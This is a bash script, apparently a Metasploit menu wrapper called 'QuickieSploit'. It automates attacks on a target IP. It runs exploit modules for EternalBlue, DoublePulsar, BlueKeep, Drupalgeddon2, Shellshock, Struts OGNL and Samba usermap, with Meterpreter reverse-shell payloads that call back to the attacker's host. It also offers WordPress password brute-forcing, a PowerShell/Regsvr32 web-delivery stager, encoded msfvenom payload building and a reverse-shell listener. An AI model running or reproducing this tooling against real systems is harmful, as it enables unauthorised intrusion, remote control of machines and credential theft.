#!/usr/bin/env bash

R='\033[0;31m' G='\033[0;32m' Y='\033[0;33m'
C='\033[0;36m' B='\033[1m'    Z='\033[0m'

RHOST=""
LHOST=""
LPORT="4444"
LPORT_HTTP="8080"
FORCE=false
PAYLOAD="windows/x64/meterpreter/reverse_tcp"
RC_DIR="$(mktemp -d /tmp/qs_XXXXXX)"
LOG_FILE="$RC_DIR/qs_session.log"
MSF_RPC_PORT=55553
MSF_RPC_PASS="$(openssl rand -hex 10 2>/dev/null || echo 'qs_rpc_default')"
MSF_DAEMON_PID=""

trap 'rm -rf "$RC_DIR"; [[ -n "$MSF_DAEMON_PID" ]] && kill "$MSF_DAEMON_PID" 2>/dev/null; pkill -f "msfrpcd.*$MSF_RPC_PORT" 2>/dev/null' EXIT

die()    { echo -e "${R}[!] $*${Z}"; exit 1; }
info()   { echo -e "${C}[*] $*${Z}"; }
ok()     { echo -e "${G}[+] $*${Z}"; }
prompt() { printf "${Y}[?] %s${Z} " "$*"; }
hr()     { echo -e "${Y}============================================================${Z}"; }

need_cmd() { command -v "$1" &>/dev/null || die "$1 not found — install it first."; }

run_rc() {
    local rc="$RC_DIR/module_$$.rc"
    printf '%s\n' "$1" > "$rc"
    info "msf loading..."
    msfconsole -q -r "$rc" 2>&1 | tee -a "$LOG_FILE"
    echo
    ok "done. log: $LOG_FILE"
    prompt "[?] load into msfconsole cmd line [y/N]:"; read -r _drop
    if [[ "$_drop" =~ ^[Yy]$ ]]; then
        info "entering msfconsole — type 'exit' to return to menu..."
        msfconsole -q 2>&1 | tee -a "$LOG_FILE"
    fi
}

check_set() {
    if [[ -z "$RHOST" ]]; then
        prompt "RHOST not set — enter target IP:"; read -r RHOST
    fi
    if [[ -z "$LHOST" ]]; then
        prompt "LHOST not set — enter your IP:"; read -r LHOST
    fi
}

force_flag() {
    $FORCE && echo "set ForceExploit true" || echo ""
}

banner() {
    clear
    echo -e "${R}${B}"
    cat <<'BANNER'
                                                                         
.oPYo.          o        8       o        .oPYo.        8         o   o  
8    8                   8                8             8             8  
8    8  o    o o8 .oPYo. 8  .o  o8 .oPYo. `Yooo. .oPYo. 8 .oPYo. o8  o8P 
8  d.8  8    8  8 8    ' 8oP'    8 8oooo8     `8 8    8 8 8    8  8   8  
8  `b8. 8    8  8 8    . 8 `b.   8 8.          8 8    8 8 8    8  8   8  
`YooP'P `YooP'  8 `YooP' 8  `o.  8 `Yooo' `YooP' 8YooP' 8 `YooP'  8   8  
:....:.::.....::..:.....:..::...:..:.....::.....:8 ....:..:.....::..::..:
::::QuickieSploit Simple MsfWrapper::::::::::::::8 ::::::::::::::::::::::
::::::::::=--BeysonSec--=::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::..::::::::::::::::::::::
BANNER
    echo -e "${Z}"
    echo -e "  ${C}RHOST${Z}: ${RHOST:-unset}  ${C}LHOST${Z}: ${LHOST:-unset}  ${C}LPORT${Z}: ${LPORT}"
    echo -e "  ${C}PAYLOAD${Z}: ${PAYLOAD}"
    echo -e "  ${C}ForceExploit${Z}: ${FORCE}  ${C}Daemon${Z}: ${MSF_DAEMON_PID:-off}"
    hr
}

configure() {
    banner
    echo -e "  ${B}Configure${Z}\n"
    prompt "RHOST [${RHOST:-empty}]:"; read -r _in; [[ -n "$_in" ]] && RHOST="$_in"
    prompt "LHOST [${LHOST:-empty}]:"; read -r _in; [[ -n "$_in" ]] && LHOST="$_in"
    prompt "LPORT [$LPORT]:";          read -r _in; [[ -n "$_in" ]] && LPORT="$_in"
    prompt "LPORT_HTTP [$LPORT_HTTP]:";read -r _in; [[ -n "$_in" ]] && LPORT_HTTP="$_in"
    echo -e "\n  ${B}Payload${Z}"
    echo "   1) windows/x64/meterpreter/reverse_tcp"
    echo "   2) windows/x64/meterpreter/reverse_https"
    echo "   3) windows/x86/meterpreter/reverse_tcp"
    echo "   4) linux/x64/meterpreter/reverse_tcp"
    echo "   5) custom"
    prompt "pick [1-5]:"; read -r _p
    case "$_p" in
        2) PAYLOAD="windows/x64/meterpreter/reverse_https" ;;
        3) PAYLOAD="windows/x86/meterpreter/reverse_tcp"   ;;
        4) PAYLOAD="linux/x64/meterpreter/reverse_tcp"     ;;
        5) prompt "full payload path:"; read -r PAYLOAD     ;;
        *) PAYLOAD="windows/x64/meterpreter/reverse_tcp"   ;;
    esac
    prompt "ForceExploit? [y/N]:"; read -r _f
    [[ "$_f" =~ ^[Yy]$ ]] && FORCE=true || FORCE=false
    ok "config saved."; sleep 1
}

mod_smb_scan() {
    check_set
    info "SMB MS17-010 scanner → $RHOST"
    run_rc "
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $RHOST
set THREADS 8
run
sleep 3
exit"
}

mod_eternalblue() {
    check_set
    info "EternalBlue MS17-010 → $RHOST"
    run_rc "
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $RHOST
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_doublepulsar() {
    check_set
    info "DoublePulsar SMB backdoor RCE → $RHOST"
    run_rc "
use exploit/windows/smb/smb_doublepulsar_rce
set RHOSTS $RHOST
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_psexec() {
    check_set
    prompt "SMBUser [Administrator]:"; read -r _u; _u="${_u:-Administrator}"
    prompt "SMBPass:"; read -r _pw
    info "SMB PsExec → $RHOST as $_u"
    run_rc "
use exploit/windows/smb/psexec
set RHOSTS $RHOST
set SMBUser $_u
set SMBPass $_pw
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_bluekeep() {
    check_set
    info "BlueKeep RDP CVE-2019-0708 → $RHOST"
    echo -e "  ${Y}targets: 1=Win7SP1  2=Win7SP1_HyperV  3=Win2008R2  4=Win2008R2_HyperV${Z}"
    prompt "TARGET id [2]:"; read -r _t; _t="${_t:-2}"
    run_rc "
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS $RHOST
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
set TARGET $_t
$(force_flag)
exploit -j"
}

mod_wpscan() {
    need_cmd wpscan
    prompt "target URL (http://target.local):"; read -r _url
    prompt "enumerate users? [Y/n]:";           read -r _eu
    prompt "wpscan API token (blank to skip):"; read -r _tok
    local _enum="vp,vt"
    [[ ! "$_eu" =~ ^[Nn]$ ]] && _enum="${_enum},u"
    local _tok_flag=""
    [[ -n "$_tok" ]] && _tok_flag="--api-token $_tok"
    info "wpscan → $_url"
    wpscan --url "$_url" \
        --enumerate "$_enum" \
        --plugins-detection aggressive \
        --random-user-agent \
        $_tok_flag \
        --no-banner \
        | tee -a "$LOG_FILE"
    ok "log: $LOG_FILE"
}

mod_wp_brute() {
    need_cmd wpscan
    prompt "target URL:"; read -r _url
    prompt "username [admin]:"; read -r _u; _u="${_u:-admin}"
    prompt "wordlist [/usr/share/wordlists/rockyou.txt]:"; read -r _wl
    _wl="${_wl:-/usr/share/wordlists/rockyou.txt}"
    [[ ! -f "$_wl" ]] && die "wordlist not found: $_wl"
    info "XML-RPC brute → $_url as $_u"
    wpscan --url "$_url" \
        --username "$_u" \
        --passwords "$_wl" \
        --no-banner \
        | tee -a "$LOG_FILE"
    ok "log: $LOG_FILE"
}

mod_web_delivery() {
    check_set
    echo -e "\n  ${B}Delivery method${Z}"
    echo "   1) PowerShell (Windows)"
    echo "   2) Python"
    echo "   3) PHP"
    echo "   4) Regsvr32 (LOLBin)"
    prompt "pick [1-4]:"; read -r _m
    local _tid
    case "$_m" in
        1) _tid=2 ;;
        2) _tid=0 ;;
        3) _tid=1 ;;
        4) _tid=3 ;;
        *) _tid=2 ;;
    esac
    info "web delivery stager on $LHOST:$LPORT_HTTP"
    run_rc "
use exploit/multi/script/web_delivery
set LHOST $LHOST
set SRVHOST $LHOST
set SRVPORT $LPORT_HTTP
set LPORT $LPORT
set TARGET $_tid
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_portscan() {
    check_set
    prompt "ports [1-10000]:"; read -r _ports; _ports="${_ports:-1-10000}"
    prompt "threads [50]:";    read -r _thr;   _thr="${_thr:-50}"
    info "TCP scan → $RHOST:$_ports"
    run_rc "
use auxiliary/scanner/portscan/tcp
set RHOSTS $RHOST
set PORTS $_ports
set THREADS $_thr
run
sleep 3
exit"
}

mod_portscan_fast() {
    check_set
    need_cmd nmap
    prompt "ports [1-10000]:"; read -r _ports; _ports="${_ports:-1-10000}"
    prompt "speed T1-T5 [T4]:"; read -r _spd;  _spd="${_spd:-T4}"
    local _out="$RC_DIR/nmap_$(date +%s).txt"
    info "nmap SYN scan → $RHOST:$_ports"
    nmap -sS -p "$_ports" -"$_spd" --open -oN "$_out" "$RHOST" 2>&1 | tee -a "$LOG_FILE"
    ok "saved: $_out"
}

mod_venom() {
    check_set
    need_cmd msfvenom
    echo -e "\n  ${B}Format${Z}"
    echo "   1) Windows EXE"
    echo "   2) Windows DLL"
    echo "   3) PowerShell (ps1)"
    echo "   4) Linux ELF"
    echo "   5) Raw shellcode (C array)"
    prompt "pick [1-5]:"; read -r _vt
    local _fmt _out
    case "$_vt" in
        2) _fmt="dll";     _out="payload.dll" ;;
        3) _fmt="psh-cmd"; _out="payload.ps1" ;;
        4) _fmt="elf";     _out="payload.elf" ;;
        5) _fmt="c";       _out="payload.c"   ;;
        *) _fmt="exe";     _out="payload.exe" ;;
    esac
    prompt "output path [$_out]:"; read -r _co
    [[ -n "$_co" ]] && _out="$_co"
    prompt "encoder (e.g. x86/shikata_ga_nai, blank for none):"; read -r _enc
    prompt "iterations [1]:"; read -r _iter; _iter="${_iter:-1}"
    local _enc_flag=""
    [[ -n "$_enc" ]] && _enc_flag="-e $_enc -i $_iter"
    info "msfvenom → $PAYLOAD → $_out"
    msfvenom -p "$PAYLOAD" \
        LHOST="$LHOST" LPORT="$LPORT" \
        -f "$_fmt" \
        $_enc_flag \
        -o "$_out" && ok "payload: $_out"
}

mod_handler() {
    check_set
    info "multi/handler → $LHOST:$LPORT  ($PAYLOAD)"
    run_rc "
use exploit/multi/handler
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
set ExitOnSession false
exploit -j"
}

mod_samba_usermap() {
    check_set
    info "Samba usermap_script CVE-2007-2447 → $RHOST"
    run_rc "
use exploit/multi/samba/usermap_script
set RHOSTS $RHOST
set LHOST $LHOST
set LPORT $LPORT
$(force_flag)
exploit -j"
}

mod_log4shell() {
    check_set
    prompt "target ports [80,443,8080,8443]:"; read -r _ports
    _ports="${_ports:-80,443,8080,8443}"
    info "Log4Shell CVE-2021-44228 scanner → $RHOST"
    run_rc "
use auxiliary/scanner/http/log4shell_scanner
set RHOSTS $RHOST
set RPORT $_ports
set SRVHOST $LHOST
set SRVPORT $LPORT_HTTP
run
sleep 3
exit"
}

mod_drupal() {
    check_set
    prompt "TARGETURI [/]:"; read -r _uri; _uri="${_uri:-/}"
    info "Drupalgeddon2 CVE-2018-7600 → $RHOST"
    run_rc "
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS $RHOST
set TARGETURI $_uri
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_shellshock() {
    check_set
    prompt "CGI path [/cgi-bin/test.cgi]:"; read -r _cgi
    _cgi="${_cgi:-/cgi-bin/test.cgi}"
    info "Shellshock Apache mod_cgi CVE-2014-6271 → $RHOST$_cgi"
    run_rc "
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS $RHOST
set TARGETURI $_cgi
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_struts() {
    check_set
    prompt "TARGETURI [/struts2-showcase/]:"; read -r _uri
    _uri="${_uri:-/struts2-showcase/}"
    info "Apache Struts OGNL RCE CVE-2017-5638 → $RHOST"
    run_rc "
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS $RHOST
set TARGETURI $_uri
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD $PAYLOAD
$(force_flag)
exploit -j"
}

mod_sessions() {
    info "dropping into msfconsole..."
    msfconsole -q -x "sessions -l" 2>&1 | tee -a "$LOG_FILE"
}

show_log() {
    if [[ -f "$LOG_FILE" ]]; then
        less +G "$LOG_FILE"
    else
        info "no log yet this session."
    fi
}

start_daemon() {
    if pgrep -f "msfrpcd.*$MSF_RPC_PORT" &>/dev/null; then
        ok "daemon already running on :$MSF_RPC_PORT"
        return
    fi
    need_cmd nc
    info "starting msfrpcd on :$MSF_RPC_PORT — cold boot takes up to 60s..."
    msfrpcd -P "$MSF_RPC_PASS" -p "$MSF_RPC_PORT" -U msf &>/dev/null &
    MSF_DAEMON_PID=$!
    local _tries=0
    until nc -z 127.0.0.1 "$MSF_RPC_PORT" 2>/dev/null || (( _tries++ >= 60 )); do
        printf '.'; sleep 1
    done
    echo
    if nc -z 127.0.0.1 "$MSF_RPC_PORT" 2>/dev/null; then
        ok "daemon up. pid=$MSF_DAEMON_PID  pass=$MSF_RPC_PASS"
    else
        die "daemon didn't bind after 60s — check msfrpcd install"
    fi
}

stop_daemon() {
    [[ -n "$MSF_DAEMON_PID" ]] && kill "$MSF_DAEMON_PID" 2>/dev/null
    pkill -f "msfrpcd.*$MSF_RPC_PORT" 2>/dev/null
    MSF_DAEMON_PID=""
    info "daemon stopped."
}

toggle_force() {
    if $FORCE; then
        FORCE=false
        info "ForceExploit disabled"
    else
        FORCE=true
        ok "ForceExploit ENABLED"
    fi
    sleep 1
}

main_menu() {
    while true; do
        banner
        echo -e "  ${B}SMB / Windows${Z}"
        echo "   [1]  SMB MS17-010 Scanner"
        echo "   [2]  EternalBlue (MS17-010)"
        echo "   [3]  DoublePulsar Backdoor RCE"
        echo "   [4]  SMB PsExec (creds required)"
        echo "   [5]  BlueKeep RDP (CVE-2019-0708)"
        echo -e "\n  ${B}Web${Z}"
        echo "   [6]  WPScan"
        echo "   [7]  WP XML-RPC Brute"
        echo "   [8]  Web Delivery Stager"
        echo "   [13] Log4Shell Scanner (CVE-2021-44228)"
        echo "   [14] Drupalgeddon2    (CVE-2018-7600)"
        echo "   [15] Shellshock       (CVE-2014-6271)"
        echo "   [16] Apache Struts    (CVE-2017-5638)"
        echo -e "\n  ${B}Utils${Z}"
        echo "   [9]  TCP Port Scanner (msf)"
        echo "   [18] TCP Port Scanner (nmap — fast)"
        echo "   [10] msfvenom Payload Generator"
        echo "   [11] Multi/Handler Listener"
        echo "   [12] Samba Usermap (CVE-2007-2447)"
        echo "   [17] Sessions"
        echo -e "\n  ${B}Options${Z}"
        echo "   [c]  Configure RHOST / LHOST / LPORT / Payload"
        echo "   [f]  Toggle ForceExploit (currently: ${FORCE})"
        echo "   [d]  Start MSF daemon (skip per-call startup)"
        echo "   [s]  Stop MSF daemon"
        echo "   [l]  View session log"
        echo "   [q]  Quit"
        hr
        prompt "select:"; read -r _choice
        case "$_choice" in
            1)   mod_smb_scan      ;;
            2)   mod_eternalblue   ;;
            3)   mod_doublepulsar  ;;
            4)   mod_psexec        ;;
            5)   mod_bluekeep      ;;
            6)   mod_wpscan        ;;
            7)   mod_wp_brute      ;;
            8)   mod_web_delivery  ;;
            9)   mod_portscan      ;;
            10)  mod_venom         ;;
            11)  mod_handler       ;;
            12)  mod_samba_usermap ;;
            13)  mod_log4shell     ;;
            14)  mod_drupal        ;;
            15)  mod_shellshock    ;;
            16)  mod_struts        ;;
            17)  mod_sessions      ;;
            18)  mod_portscan_fast ;;
            c|C) configure         ;;
            f|F) toggle_force      ;;
            d|D) start_daemon      ;;
            s|S) stop_daemon       ;;
            l|L) show_log          ;;
            q|Q) info "clean exit."; exit 0 ;;
            *)   echo -e "${R}unknown${Z}"; sleep 0.4 ;;
        esac
    done
}

need_cmd msfconsole
main_menu